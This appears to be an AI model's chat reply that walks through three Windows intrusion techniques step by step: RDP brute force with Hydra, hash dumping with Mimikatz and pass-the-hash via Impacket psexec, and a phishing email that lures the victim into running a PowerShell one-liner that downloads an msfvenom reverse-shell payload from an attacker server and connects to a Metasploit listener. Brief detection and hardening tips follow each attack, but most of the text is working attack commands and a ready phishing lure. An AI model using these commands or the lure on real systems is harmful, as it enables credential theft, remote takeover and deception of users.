Here’s a demonstration of **three additional attack techniques** that could be used to gain access to a Windows 10 desktop or Windows Server 2016:  

1. **RDP Brute Force Attack**  
2. **Pass-the-Hash Attack**  
3. **Phishing Attack (PowerShell Payload)**  

Each attack will include **step-by-step execution** and **detection & prevention tips**.

---

## **1. RDP Brute Force Attack**
### **Overview**
If Remote Desktop Protocol (RDP) is enabled on a Windows machine and has weak credentials, an attacker can use brute-force tools to guess the password.

### **Step 1: Enable RDP on Windows (for testing)**
To ensure RDP is enabled on your test Windows machine:
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
Verify RDP is running:
```powershell
netstat -ano | findstr 3389
```

---

### **Step 2: Brute Force RDP Using Hydra**
On **Kali Linux**, install Hydra if not installed:
```bash
sudo apt update && sudo apt install hydra -y
```
Run Hydra against the Windows target:
```bash
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```
> Replace `192.168.1.10` with your **Windows target IP**.  
> Replace `users.txt` and `passwords.txt` with your username and password lists.

If successful, Hydra will return valid credentials.

---

### **Detection & Prevention**
- **Detect Failed RDP Logins**  
  Open **Event Viewer** → **Windows Logs** → **Security**  
  Look for **Event ID 4625** (failed login attempts).
- **Block Brute Force Attempts**  
  - Enable **Account Lockout Policy**:
    ```powershell
    net accounts /lockoutthreshold:3
    ```
  - Disable RDP if not needed:
    ```powershell
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 1
    ```
  - Use **strong passwords** and **multi-factor authentication (MFA)**.

---

## **2. Pass-the-Hash Attack**
### **Overview**
This attack allows an attacker to authenticate as a user without knowing the plaintext password by using the **NTLM hash**.

---

### **Step 1: Extract NTLM Hashes**
If the attacker has **local admin** access, they can extract hashes using Mimikatz.

1. Download and run **Mimikatz**:
```powershell
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20201008/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive -Path "mimikatz.zip" -DestinationPath .
```
2. Launch Mimikatz as **Administrator**:
```powershell
.\mimikatz.exe
```
3. Dump NTLM hashes:
```mimikatz
privilege::debug
lsadump::sam
```
> Example output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
The **third field** is the NTLM hash.

---

### **Step 2: Use the Hash to Authenticate**
On **Kali Linux**, use **psexec.py** from Impacket:
```bash
sudo apt install impacket-scripts -y
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
```
This gives the attacker **SYSTEM-level access** to the target Windows machine.

---

### **Detection & Prevention**
- **Monitor for Unusual Logins**  
  Check **Event Viewer** → **Security Logs** for **Event ID 4624** (logins) from suspicious IPs.
- **Prevent Hash Dumping**
  - Disable **WDigest Authentication**:
    ```powershell
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
    ```
  - Enable **Credential Guard** to prevent hash dumping.

---

## **3. Phishing Attack (PowerShell Payload)**
### **Overview**
An attacker sends a phishing email with a **PowerShell payload** that executes a reverse shell.

---

### **Step 1: Create a Malicious PowerShell Script**
On **Kali Linux**, generate a PowerShell script:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-reflection > payload.ps1
```
---

### **Step 2: Host the Malicious Script**
Start a **Python web server** to serve the payload:
```bash
python3 -m http.server 8080
```
---

### **Step 3: Craft a Phishing Email**
The attacker sends an email with:
```html
Dear User,  

We have detected unusual activity on your account. Please run the following security check in PowerShell:  

```powershell
iex (New-Object Net.WebClient).DownloadString("http://192.168.1.100:8080/payload.ps1")
```
This executes the script **without saving it**, giving the attacker access.

---

### **Step 4: Setup Metasploit Listener**
On **Kali Linux**:
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```
Once the victim runs the script, the attacker gets a **remote shell**.

---

### **Detection & Prevention**
- **Detect Suspicious PowerShell Activity**
  Open **Event Viewer** → **Windows Logs** → **Security**  
  Look for **Event ID 4688** (PowerShell execution from unknown sources).
- **Prevent Execution of Malicious Scripts**
  ```powershell
  Set-ExecutionPolicy Restricted -Force
  ```
- **Use Email Filtering**  
  Block **.ps1, .exe, .bat** attachments in **Microsoft Exchange** or **Google Workspace**.

---

## **Final Thoughts**
These three attack vectors demonstrate how a **Windows system can be compromised**:
1. **RDP Brute Force** – Exploits weak passwords on Remote Desktop.
2. **Pass-the-Hash** – Uses stolen credentials to authenticate.
3. **Phishing (PowerShell Payload)** – Tricks users into running malicious scripts.

Would you like assistance in **hardening your Windows Server** against these attacks? 🚀